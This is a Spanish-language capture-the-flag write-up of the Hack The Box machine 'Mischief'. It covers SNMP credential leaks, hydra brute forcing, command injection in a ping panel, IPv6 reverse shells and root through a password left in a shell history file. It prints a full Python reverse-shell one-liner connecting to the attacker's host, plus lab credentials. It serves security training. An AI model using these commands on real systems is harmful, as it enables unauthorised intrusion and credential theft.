HOST-RESOURCES-MIB::hrSWRunIndex.711 = INTEGER: 711
HOST-RESOURCES-MIB::hrSWRunName.711 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunID.711 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.711 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunParameters.711 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
HOST-RESOURCES-MIB::hrSWRunType.711 = INTEGER: application(4)
HOST-RESOURCES-MIB::hrSWRunStatus.711 = INTEGER: runnable(2)
```

Pues bueno con estas credenciales podemos conectarnos al primer panel de login que es el que se esta corriendo en el puerto **3366**

![](/assets/images/htb-writeup-mischief/web9.png)

Vamos a usar las credenciales **loki:godofmischiefisloki** y funcionan 

![](/assets/images/htb-writeup-mischief/web10.png)

Y bueno nos están compartiendo credenciales las cuales sabemos que 1 es valida por que nos pudimos conectar pero tenemos otra contraseña pero lo raro es que es para el mismo usuario

```bash
❯ catn creds.txt
loki:godofmischiefisloki
loki:trickeryanddeceit
```

Bueno si nos ponemos a pensar tenemos otro panel de login que es el que encontramos mediante la **IPv6** asi que lo que podemos hacer es tratar de ver si el usuario funciona y estas usando por ejemplo **admin:contraseña** , o usuarios por defecto

Si probamos con **liko** y las 2 contraseñas ninguna funciona al igual que cuando pobre con **root** o **admin** 

![](/assets/images/htb-writeup-mischief/web11.png)

Podemos usar **hydra** para ver si alguna credencial es valida con usuarios de algún **.txt** de **seclists** y en otro archivo podemos poner las contraseñas que tenemos para ver si funciona 

```bash
❯ hydra mischief.htb -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P passwords.txt http-form-post "/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-27 15:01:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:17/p:2), ~3 tries per task
[DATA] attacking http-post-form://mischief.htb:80/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match
[80][http-post-form] host: mischief.htb   login: administrator   password: trickeryanddeceit
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-27 15:01:53
```

Ahora sabiendo que el usuario **administrator** es correcto con esa credencial lo que podemos hacer ahora es conectarnos para poder así ver lo que hay dentro

![](/assets/images/htb-writeup-mischief/web12.png)

Ademas nos están diciendo que en su directorio personal tiene su contraseña en un archivo llamado **credentials** si le damos **Execute** vemos que se ejecuta el comando 

![](/assets/images/htb-writeup-mischief/web13.png)

Lo que podemos hacer es básicamente usar **tcpdump** para para ponernos en escucha por la interfaz **tun0** en escucha de trazas **icmp** si que nos aplique resolución **DNS** y hacernos un ping a nuestra **IP** para ver si nos llega la traza 

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

![](/assets/images/htb-writeup-mischief/web14.png)

Y nos llega

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:07:31.601113 IP 10.10.10.92 > 10.10.14.12: ICMP echo request, id 1596, seq 1, length 64
15:07:31.601143 IP 10.10.14.12 > 10.10.10.92: ICMP echo reply, id 1596, seq 1, length 64
15:07:32.717001 IP 10.10.10.92 > 10.10.14.12: ICMP echo request, id 1596, seq 2, length 64
15:07:32.717023 IP 10.10.14.12 > 10.10.10.92: ICMP echo reply, id 1596, seq 2, length 64
```

Lo que podemos hacer es concatenar un **;** para ver si podemos ejecutar otro comando por ejemplo `ping -c 2 127.0.0.1; whoami` pero en lo raro es que ahora nos muestra el **output** del primer comando solamente 

![](/assets/images/htb-writeup-mischief/web15.png)

Algo que podemos tratar de hacer borrar el **ping** por que bueno nos dicen que es un **Command Execution Panel** así que podemos tratar de ejecutar el **whoami** solamente pero indicándole el **;** por que ya vimos que indicándole esto podemos ver básicamente el **output** del comando 

![](/assets/images/htb-writeup-mischief/web16.png)

## Shell as www-data

Bueno ya con esto podríamos enviarnos una **reverse shell** pero no funciona pero hay que recordar que estamos mediante **IPv6** y siempre lo hemos hecho por **IPv4** tomando en cuenta que es una maquina **Insane** y que nos hicieron hacer todo por **IPv6** lo mas probable es que haya reglas **iptables** que bloquean que nos podamos enviar una reverse shell por **IPv4** pero bueno también tenemos **IPv6** así que lo haremos mediante esto 

Bueno algo también que podemos hacer es que si recordamos nos decían que había un archivo que se llama credentials así que como podemos ejecutar comandos podemos tratar de leer el archivo `ping -c 2 127.0.0.1; cat /home/loki/c*;`

![](/assets/images/htb-writeup-mischief/web18.png)

Esa contraseña no la habíamos tenido así que podemos conectarnos por **SSH**

```bash
❯ ssh loki@10.10.10.92
The authenticity of host '10.10.10.92 (10.10.10.92)' can't be established.
ECDSA key fingerprint is SHA256:deaxXTK7ORthfGcKdblPRUmgNrU20oclqMbwVj3hzYI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.92' (ECDSA) to the list of known hosts.
loki@10.10.10.92's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 27 21:47:11 UTC 2023

  System load:  0.01              Processes:            162
  Usage of /:   61.5% of 6.83GB   Users logged in:      0
  Memory usage: 36%               IP address for ens33: 10.10.10.92
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Sat Jul 14 12:44:04 2018 from 10.10.14.4
loki@Mischief:~$ 
```

Pero bueno también vamos a enviarnos una **reverse shell** por **IPv6**

Bueno primero necesitamos saber cual es nuestra **IPv6** de la **VPN** de **Hackthebox** así que podemos hacer esto 

```bash
❯ ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.12  netmask 255.255.254.0  destination 10.10.14.12
        inet6 dead:beef:2::100a  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::6f5e:e876:b411:3f2b  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 86518  bytes 6495608 (6.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 90080  bytes 5887972 (5.6 MiB)
        TX errors 0  dropped 1951 overruns 0  carrier 0  collisions 0
```

Y ahora nos ponemos en escucha con **netcat** hay que tener en una versión reciente a mi paso que lo tenia desactualizado y no podía entablar nada por que me daba error 

```bash
❯ apt upgrade netcat  
```

```bash
❯ nc -nv -l dead:beef:2::100a 443
Listening on dead:beef:2::100a 443
```

Nos vamos a entablar la **reverse-shell** con **Python** ya que esta corriendo <https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet> entonces nos vamos a copear todo el **oneliner** con **python** 

Y modificamos la **shell** indicándole nuestra **IPv6** 

![](/assets/images/htb-writeup-mischief/web19.png)

Si hacemos un **send** ganamos acceso

```bash
❯ nc -nv -l dead:beef:2::100a 443
Listening on dead:beef:2::100a 443
Connection received on dead:beef::250:56ff:feb9:5fae 41436
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
``` 

Y hay vemos las mismas credenciales

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@Mischief:/home/loki$ pwd
pwd
/home/loki
www-data@Mischief:/home/loki$ cat credentials
cat credentials
pass: lokiisthebestnorsegod
www-data@Mischief:/home/loki$ 
```

Vamos a dejar la **shell** por si acaso

```bash
❯ nc -nv -l dead:beef:2::100a 443
Listening on dead:beef:2::100a 443
Connection received on dead:beef::250:56ff:feb9:5fae 41438
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@Mischief:/var/www/html$ ^Z
zsh: suspended  nc -nv -l dead:beef:2::100a 443
❯ stty raw -echo; fg
[1]  + continued  nc -nv -l dead:beef:2::100a 443
                                                 reset xterm
ENTER
www-data@Mischief:/var/www/html$ export TERM=xterm
```

## Shell as looki

Ahora nos conectamos por **SSH**

```bash
❯ ssh loki@10.10.10.92
loki@10.10.10.92's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 27 22:13:52 UTC 2023

  System load:  0.0               Processes:            163
  Usage of /:   61.5% of 6.83GB   Users logged in:      0
  Memory usage: 36%               IP address for ens33: 10.10.10.92
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jun 27 21:47:12 2023 from 10.10.14.12
loki@Mischief:~$ export TERM=xterm
loki@Mischief:~$ 
```

## User.txt 

```bash
loki@Mischief:~$ cat user.txt 
bf58078e7b802c5f32b545eea7c90060
loki@Mischief:~$ 
```

## Escalada de Privilegios 

Estamos en la maquina victima

```bash
loki@Mischief:~$ hostname -I
10.10.10.92 dead:beef::250:56ff:feb9:5fae 
loki@Mischief:~$ 
```

Tendríamos que convertirnos en **root** ya que no hay mas usuarios que tenga una **Bash**

```bash
loki@Mischief:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
loki:x:1000:1004:loki:/home/loki:/bin/bash
loki@Mischief:~$ 
```

Si vemos si tenemos permisos a nivel de sudoers no nos deja 

```bash
loki@Mischief:~$ sudo -l
-bash: /usr/bin/sudo: Permission denied
loki@Mischief:~$ 
```

Y bueno no nos están dejando ejecutarlo

```bash
loki@Mischief:~$ getfacl /bin/su
getfacl: Removing leading '/' from absolute path names
# file: bin/su
# owner: root
# group: root
# flags: s--
user::rwx
user:loki:r--
group::r-x
mask::r-x
other::r-x

loki@Mischief:~$ 
```

Si buscamos por privilegios **SUID** vemos el **pkexec** pero no lo vamos a explotar

```bash
loki@Mischief:/$ find \-perm -4000 2>/dev/null
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/newgidmap
./usr/bin/passwd
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/newuidmap
./usr/bin/traceroute6.iputils
./usr/bin/chfn
./usr/bin/chsh
./usr/bin/at
./usr/bin/gpasswd
./bin/umount
./bin/ntfs-3g
./bin/su
./bin/mount
./bin/fusermount
./bin/ping
loki@Mischief:/$ 
```

Bueno podemos leer el **bash_history** y tenemos una contraseña al no haber mas usuarios podemos suponer que es la del usuario **root** 

```bash
loki@Mischief:~$ cat .bash_history 
python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
exit
free -mt
ifconfig
cd /etc/
sudo su
su
exit
su root
ls -la
sudo -l
ifconfig
id
cat .bash_history 
nano .bash_history 
exit
loki@Mischief:~$ 
```

## Shell as root Option 1 && root flag 

Pues bueno como otros usuarios pueden ejecutar **su** podemos hacerlo con **www-data** y le pasamos la contraseña que encontramos en el **.bash_history**

```bash
www-data@Mischief:/var/www/html$ su
Password: 
root@Mischief:/var/www/html# whoami
root
root@Mischief:/var/www/html# 
```

Pero bueno nos están diciendo que aquí nos esta la flag 

```bash
root@Mischief:~# cat root.txt 
The flag is not here, get a shell to find it!
root@Mischief:~# 
```

Pero no es tan difícil buscarla

```bash
root@Mischief:~# find / -name root.txt
/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
/root/root.txt
root@Mischief:~# 
```

```bash
root@Mischief:~# cat /usr/lib/gcc/x86_64-linux-gnu/7/root.txt
ae155fad479c56f912c65d7be4487807
root@Mischief:~# 
```

## Shell as root Option 2 

Pues bueno nos dicen que nos enviemos una **shell** así que podemos hacer eso 

Como alternativa podemos usar `systemd-run`  

![](/assets/images/htb-writeup-mischief/web20.png)

Nos podemos en escucha como la anterior vez como ya tenemos el **netcat** actualizado podemos indicarle que la conexión es por **IPv6** 

```bash
❯ nc -6 -lnvp 444
Listening on :: 444
```

Ahora nos enviamos la shell y le pasamos la contraseña de **root** 

```bash
loki@Mischief:~$ systemd-run python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::100a",444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.
Authenticating as: root
Password: 
==== AUTHENTICATION COMPLETE ===
Running as unit: run-u22.service
loki@Mischief:~$ 
```

Nos llega la **shell**

```bash
❯ nc -6 -lnvp 444
Listening on :: 444
Connection received on dead:beef::250:56ff:feb9:5fae 50630
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# 
```
